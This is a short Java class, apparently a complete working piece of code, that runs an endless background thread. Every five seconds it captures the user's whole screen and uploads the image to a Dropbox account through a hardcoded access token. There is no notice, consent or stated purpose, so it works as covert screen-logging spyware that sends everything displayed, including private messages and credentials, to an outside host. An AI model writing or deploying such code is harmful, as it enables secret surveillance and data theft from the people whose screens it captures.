import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    public DbxClientV2 client;

    @Override
    public void run() {

        String ACCESS_TOKEN = "TOKEN";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, ACCESS_TOKEN);

        for (; ; ) {
            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle screenRectangle = new Rectangle(screenSize);
            Robot robot = null;
            try {
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            BufferedImage image = robot.createScreenCapture(screenRectangle);

            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date now = new Date();
            String date = formatter.format(now);

            ByteArrayOutputStream fos = new ByteArrayOutputStream();
            try {
                ImageIO.write(image, "png", fos);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            try {
                byte[] bytes = fos.toByteArray();
                InputStream is = new ByteArrayInputStream(bytes);
                client.files().uploadBuilder("/" + date + ".png")
                        .uploadAndFinish(is);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            try {
                sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }


    }
}
